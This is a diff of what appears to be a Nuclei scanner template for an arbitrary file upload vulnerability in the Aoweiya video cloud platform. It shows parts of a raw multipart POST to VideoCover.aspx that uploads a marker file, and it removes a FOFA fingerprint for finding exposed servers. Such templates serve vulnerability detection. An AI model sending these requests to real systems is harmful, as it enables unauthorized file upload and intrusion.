@@ -3,12 +3,8 @@ info:
   name: 奥威亚-视频云平台-VideoCover.aspx-任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ngy5wxq9bol3avc5'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ngy5wxq9bol3avc5
-    fofa: body="Copyright © 2005-2018 广州市奥威亚电子科技有限公司" body="/Upload/DomainInfo/MaxAVALogo.png" body="/CSS/NewtonTheme/assets/app.css"
 http:
 - raw:
   - 'POST /Tools/Video/VideoCover.aspx HTTP/1.1
@@ -38,8 +34,6 @@ http:
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLx7ATxHThfk91oxQ
 
 
-
-
     ------WebKitFormBoundaryLx7ATxHThfk91oxQ
 
 
@@ -47,8 +41,6 @@ http:
 
 
     Content-Type: image/jpeg
-
-
 
 
     dudesuite
